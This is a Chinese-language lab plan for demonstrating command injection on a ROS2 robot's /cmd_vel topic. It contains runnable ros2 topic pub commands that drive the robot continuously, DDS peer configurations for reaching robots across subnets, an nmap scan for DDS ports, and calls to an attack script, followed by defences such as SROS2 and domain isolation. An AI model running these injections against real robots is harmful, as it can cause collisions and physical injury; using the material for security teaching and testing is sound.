# /cmd_vel 注入攻击实验方案

## 📋 攻击概述

本实验演示如何对 ROS2 机器人的 `/cmd_vel` 控制话题进行注入攻击，展示机器人系统的安全漏洞。

## 🔍 ROS2 通信架构与攻击层面

### ROS2 通信栈

```
应用层 (ROS2 Nodes)
    ↓
ROS2 中间件层 (rmw_implementation)
    ↓
DDS 层 (Data Distribution Service)
    ↓
网络层 (UDP/TCP, Multicast/Unicast)
    ↓
物理层 (Ethernet/WiFi)
```

### 攻击层面分析

#### 1. **应用层攻击** (最简单，本实验重点)
- **位置**: ROS2 节点层面
- **原理**: 直接创建恶意节点发布到 `/cmd_vel`
- **要求**: 能够运行 ROS2 节点（同一台机器或同一网络）
- **难度**: ⭐ 简单
- **适用场景**: 本地攻击、已获得系统访问权限

#### 2. **ROS2/DDS 层攻击**
- **位置**: DDS 发现和通信层
- **原理**: 利用 DDS 的自动发现机制（多播）
- **要求**: 同一网络或配置了相同的 ROS_DOMAIN_ID
- **难度**: ⭐⭐ 中等
- **适用场景**: 局域网攻击

#### 3. **网络层攻击**
- **位置**: 网络数据包层面
- **原理**: 拦截/伪造 DDS 数据包
- **要求**: 网络访问权限、DDS 协议知识
- **难度**: ⭐⭐⭐ 困难
- **适用场景**: 中间人攻击、网络渗透

#### 4. **物理层攻击**
- **位置**: 物理网络连接
- **原理**: 物理接入网络
- **要求**: 物理访问
- **难度**: ⭐⭐ 中等
- **适用场景**: 现场攻击

## 🎯 实验 1: 应用层注入攻击（本地）

### 攻击场景
攻击者已获得系统访问权限，在同一台机器上运行恶意节点。

### 实现方法

**方法 A: 直接发布恶意命令**

```bash
# 持续发送前进命令（让机器人失控）
ros2 topic pub /cmd_vel geometry_msgs/msg/TwistStamped \
  "{header: {stamp: {sec: 0, nanosec: 0}, frame_id: 'base_link'}, \
   twist: {linear: {x: 0.5, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0.0}}}" \
  --rate 10
```

**方法 B: 使用 Python 脚本（更灵活）**

见 `attack_cmd_vel.py` 脚本。

### 攻击效果
- ✅ 机器人持续前进，无法停止
- ✅ 覆盖合法控制命令
- ✅ 可能导致碰撞或失控

## 🌐 实验 2: 网络层注入攻击（跨机器）

### 攻击场景
攻击者在同一网络内的另一台机器上，通过网络注入恶意命令。

### 前置条件

1. **网络连接**
   - 攻击者机器和目标机器在同一网络
   - 或配置了 DDS 路由

2. **ROS2 环境配置**

在攻击者机器上：
```bash
# 安装 ROS2（与目标机器相同版本）
# Ubuntu 22.04: ros-humble-desktop
# Ubuntu 24.04: ros-jazzy-desktop

# 设置相同的域 ID（默认是 0）
export ROS_DOMAIN_ID=0

# 或者使用不同的域 ID，但需要配置 DDS 路由
```

3. **DDS 配置（如果需要跨子网）**

创建 `DDS_ROUTING.xml`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<CycloneDDS>
  <Domain>
    <Id>0</Id>
    <General>
      <NetworkInterfaceAddress>auto</NetworkInterfaceAddress>
      <AllowMulticast>true</AllowMulticast>
    </General>
    <Discovery>
      <ParticipantIndex>auto</ParticipantIndex>
      <Peers>
        <Peer Address="目标机器IP"/>
      </Peers>
    </Discovery>
  </Domain>
</CycloneDDS>
```

设置环境变量：
```bash
export CYCLONEDDS_URI=file:///path/to/DDS_ROUTING.xml
```

### 攻击步骤

1. **在攻击者机器上运行攻击脚本**
```bash
python3 attack_cmd_vel.py --mode network --target-ip <目标IP>
```

2. **验证连接**
```bash
# 在攻击者机器上检查是否能发现目标
ros2 node list
ros2 topic list
```

3. **执行攻击**
```bash
python3 attack_cmd_vel.py --attack spin --duration 10
```

## 🖥️ 实体机器攻击部署指南

### 场景 A: 同一局域网（最常见）

**拓扑**:
```
[攻击者机器] ----(WiFi/Ethernet)---- [机器人]
    192.168.1.100             192.168.1.101
```

**步骤**:

1. **确保网络连接**
```bash
# 在攻击者机器上 ping 机器人
ping <机器人IP>

# 检查端口（DDS 默认使用多播和随机端口）
# ROS2 使用 DDS，端口是动态的
```

2. **配置 ROS2 环境**
```bash
# 在攻击者机器上
source /opt/ros/jazzy/setup.bash  # 或 humble
export ROS_DOMAIN_ID=0  # 与机器人相同

# 验证发现
ros2 daemon stop  # 重启 daemon
ros2 node list    # 应该能看到机器人的节点
ros2 topic list   # 应该能看到 /cmd_vel
```

3. **执行攻击**
```bash
python3 attack_cmd_vel.py --attack forward --speed 0.5
```

### 场景 B: 跨网络/子网

**拓扑**:
```
[攻击者机器] ----(Internet/VPN)---- [路由器] ---- [机器人]
  10.0.0.100                         192.168.1.1   192.168.1.101
```

**配置 DDS 路由**:

1. **在攻击者机器上创建 DDS 配置**
```bash
cat > ~/dds_attack_config.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<CycloneDDS>
  <Domain>
    <Id>0</Id>
    <General>
      <NetworkInterfaceAddress>auto</NetworkInterfaceAddress>
      <AllowMulticast>false</AllowMulticast>
    </General>
    <Discovery>
      <ParticipantIndex>auto</ParticipantIndex>
      <Peers>
        <Peer Address="<机器人IP>"/>
      </Peers>
    </Discovery>
  </Domain>
</CycloneDDS>
EOF

export CYCLONEDDS_URI=file://$HOME/dds_attack_config.xml
```

2. **在机器人上配置（如果需要双向通信）**
```bash
# 在机器人上创建类似配置，添加攻击者 IP
```

3. **执行攻击**
```bash
python3 attack_cmd_vel.py --attack network
```

### 场景 C: WiFi 中间人攻击

如果攻击者可以接入同一 WiFi 网络：

1. **接入网络**（合法或非法）
2. **发现机器人**
```bash
# 扫描网络中的 ROS2 节点
nmap -p 7400-7500 <网络段>
```

3. **配置并攻击**
```bash
export ROS_DOMAIN_ID=0
python3 attack_cmd_vel.py --attack stealth
```

## 🛡️ 防御措施

### 1. 使用 ROS_DOMAIN_ID 隔离
```bash
# 在机器人上使用非默认域
export ROS_DOMAIN_ID=42  # 使用随机数字
```

### 2. 网络隔离
- 使用防火墙限制 DDS 端口
- 使用 VPN 或专用网络

### 3. 消息认证
- 使用 SROS2 (Secure ROS2) 进行消息加密和认证
- 实现节点身份验证

### 4. 访问控制
- 限制网络访问
- 使用 ACL (Access Control Lists)

### 5. 监控和检测
- 监控异常的 `/cmd_vel` 发布者
- 实现命令验证和限流

## 📊 实验报告要点

1. **攻击层面**: 说明在哪个层面进行了攻击
2. **攻击方法**: 详细描述攻击步骤
3. **攻击效果**: 记录机器人的反应
4. **防御建议**: 提出针对性的防御措施
5. **网络拓扑**: 绘制攻击场景的网络图

## ⚠️ 注意事项

1. **仅用于教育目的**: 本实验仅用于安全研究和教育
2. **获得授权**: 在实体机器上测试前，确保获得明确授权
3. **隔离环境**: 建议在隔离的网络环境中进行实验
4. **数据备份**: 实验前备份重要数据

